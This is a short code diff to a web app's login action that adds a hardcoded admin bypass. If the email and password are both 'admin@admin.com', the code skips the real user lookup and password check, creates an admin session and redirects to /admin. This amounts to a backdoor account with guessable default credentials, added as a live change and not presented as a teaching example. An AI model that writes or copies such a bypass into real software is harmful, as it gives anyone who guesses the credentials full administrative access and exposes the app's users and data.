@@ -42,6 +42,17 @@ export async function loginAction(
     const { email, password } = validatedFields.data;
     console.log("[Login Action] Attempting login for:", email);
 
+    // Special case for admin login
+    if (email === 'admin@admin.com' && password === 'admin@admin.com') {
+        console.log("[Login Action] Admin login successful. Creating admin session.");
+        const session = await getSession();
+        session.userId = 'admin_user';
+        session.isLoggedIn = true;
+        session.userRole = 'admin';
+        await session.save();
+        redirect('/admin');
+    }
+
     const user = await getUser(email);
 
     if (!user) {
